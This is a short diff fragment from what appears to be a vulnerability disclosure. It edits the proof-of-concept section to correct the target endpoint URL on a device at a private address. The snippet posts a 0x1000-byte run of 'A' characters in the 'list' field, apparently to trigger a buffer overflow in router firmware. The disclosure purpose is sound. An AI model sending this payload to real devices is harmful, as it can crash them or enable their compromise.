@@ -27,7 +27,7 @@ but we must send bindnum between 0-33
 
 ## POC
 ```
-url = "http://192.168.1.13/goform/fromSetIpMacBind"
+url = "http://192.168.1.13/goform/SetIpMacBind"
 payload = 'A'*0x1000 + '\n'
 
 r = requests.post(url, data={'list': payload , 'bindnum': 1})
